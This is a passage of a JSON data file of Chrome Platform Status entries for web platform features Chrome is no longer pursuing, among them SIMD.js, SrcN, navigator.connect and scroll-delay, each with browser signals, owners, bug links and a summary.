        ],
        "flag": false,
        "bug": "https://crbug.com/839402",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The `currencySystem` member was removed from PaymentRequest API spec. Removal at this time does not preclude it being added to a future version of the API. Current implementations of Payment Request API allow the use of well-formed currency codes that are not part of the official ISO4217 registry. If the provided code is a currency that the browser knows how to display, then an implementation will generally display the appropriate currency symbol in the user interface.",
    "id": 4887385041010688,
    "resources": {
      "samples": [
        "https://w3c-test.org/payment-request/payment-request-ctor-currency-code-checks.https.html"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:29:05.658310",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove non-primary button click event",
    "tags": [
      "Middle click event",
      "non primary mouse click"
    ],
    "comments": "This change practically hides any action that was done in js as the result of listening to click event of non primary buttons (like middle click). Particularly the functionality of preventDefault on click event for middle click on link which prevents opening a new tab is no longer possible.\r\nThe specified behavior removes non-primary button click event dispatched to js regardless of the target.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/uievents/#event-type-click",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "nzolghadr@chromium.org",
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/255",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "According to the spec https://w3c.github.io/uievents/#event-type-click the non-primary buttons should not fire mouse click events. This is the change to make Chrome inline with the spec in that regards.\r\n\r\nThis change is no longer pursued. But it will be done as part of another change with auxclick:\r\nhttps://www.chromestatus.com/feature/5663174342737920",
    "id": 5769439450497024,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:29:04.035200",
      "by": "ericbidelman@google.com"
    },
    "name": "SIMD.js",
    "tags": [
      "simd",
      "simd.js",
      "single instruction multiple data"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://tc39.github.io/ecmascript_simd/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://blog.mozilla.org/javascript/2015/03/10/state-of-simd-js-performance-in-firefox/",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "bbudge@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=4124",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://dev.windows.com/en-us/microsoft-edge/platform/status/simdes7",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "SIMD.js exposes hardware SIMD instructions to Javascript applications in a platform-independent way. Add three SIMD vector types: float32x4, float64x2, and int32x4, and corresponding Typed Array views.\r\n\r\nSIMD.js can speed up applications that process lots of data that is naturally organized as 2, 3, or 4 element vectors. SIMD is also useful when compiling native code to Javascript for static compilation by the Javascript engine.",
    "id": 5757910432874496,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:27.741620",
      "by": "ericbidelman@google.com"
    },
    "name": "SrcN",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://tabatkins.github.io/specs/respimg/Overview.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=870021#c9",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "yoav@yoav.ws"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://code.google.com/p/chromium/issues/detail?id=306893",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "SrcN is a responsive images solution which addresses all 3 major use-cases within a single syntax. It addresses DPR switching (like srcset), art-direction (like picture) and viewport dimensions based switching.",
    "id": 4582090154704896,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:41.631880",
      "by": "ericbidelman@google.com"
    },
    "name": "Subpixel precision for clientWidth, offsetWidth, scrollTop, et al",
    "comments": "This could have compatibility issues as we are changing the data type for existing properties. Some websites may depend on the values being integers. ",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://www.w3.org/TR/cssom-view/#scrolloptionsvertical",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "eae@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/360889",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The latest draft of the CSS OM spec changed the type for a number of Element and HTMLElement properties from long to float. \r\n\r\nSpecifically the following properties:\r\nElement::clientHeight\r\nElement::clientWidth\r\nElement::clientLeft\r\nElement::clientTop\r\nElement::scrollTop\r\nElement::scrollLeft\r\nElement::scrollWidth\r\nElement::scrollHeight\r\nHTMLElement::offsetWidth\r\nHTMLElement::offsetHeight\r\nHTMLElement::offsetTop\r\nHTMLElement::offsetLeft\r\n",
    "id": 5497402177880064,
    "resources": {
      "docs": [
        "Latest version of spec has these back to Integer given feedback from browser vendors and web developers."
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:41.592740",
      "by": "ericbidelman@google.com"
    },
    "name": "WebGL Shared Resources",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.khronos.org/registry/webgl/extensions/WEBGL_shared_resources/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "gman@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/235718",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allow sharing resources between 2 or more WebGL contexts",
    "id": 5486563022602240,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:57.105920",
      "by": "ericbidelman@google.com"
    },
    "name": "beforescriptexecute and afterscriptexecute events",
    "comments": "Webkit bug with a feature request from web developers, but no (definite) answer from Webkit developers: https://bugs.webkit.org/show_bug.cgi?id=91463\r\n\r\nRemoved from the specification: https://github.com/whatwg/html/pull/1103",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/multipage/scripting.html#the-script-element",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=587931",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "rob@robwu.nl"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/168175",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The beforescriptexecute and afterscriptexecute events allows web pages and extension developers to monitor the insertion of <script> tags in a web page and prevent the script from executing.",
    "id": 5711871906676736,
    "resources": {}
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-06-14 18:29:09.260200",
      "by": "ericbidelman@google.com"
    },
    "name": "canvasResolution",
    "comments": "Intent: https://groups.google.com/a/chromium.org/forum/#!searchin/blink-dev/canvasResolution/blink-dev/fRWlQ3GvlVA/rDomP793wxkJ",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.whatwg.org/specs/web-apps/current-work/multipage/the-canvas-element.html#dom-screen-canvasresolution",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/254990",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Provide css to device pixel ratio through window.screen.canvasResolution",
    "id": 6015428115562496,
    "resources": {}
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:31:21.952330",
      "by": "ericbidelman@google.com"
    },
    "name": "navigator.connect",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://mkruisselbrink.github.io/navigator-connect/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "mek@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "flag": false,
        "bug": "http://crbug.com/426458",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allow cross-domain postMessage() to a Service Worker.\r\n\r\nWe are now focusing on the \"foreign fetch\" solution to this problem proposed by Mozilla rather than this navigator.connect solution.",
    "id": 5709330426888192,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/16iX4Tj4i0dL6CRnLYx3ekLQ5h2GVPDWuAClsI9CLg04/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:50.035710",
      "by": "ericbidelman@google.com"
    },
    "name": "scroll-delay",
    "comments": "Has negative implications for scrolling performance, and so will not be suitable for use on most websites.  Designed for \"silk\" native-like mobile web applications.\r\n",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "rbyers@chromium.org",
          "tdresser@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/421513",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://lists.w3.org/Archives/Public/public-pointer-events/2014JulSep/0081.html",
          "text": "Opposed",
          "val": 7
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Give advanced web applications the ability to force scrolling to run synchronously with JavaScript in order to enable scroll-linked effects.",
    "id": 5668176855564288,
    "resources": {
      "docs": [
        "https://docs.google.com/a/chromium.org/document/d/1aOQRw76C0enLBd0mCG_-IM6bso7DxXwvqTiRWgNdTn8/edit#heading=h.wi06xpj70hhd",
        "",
        "http://lists.w3.org/Archives/Public/www-style/2014Oct/0150.html"
      ]
    }
  }
]
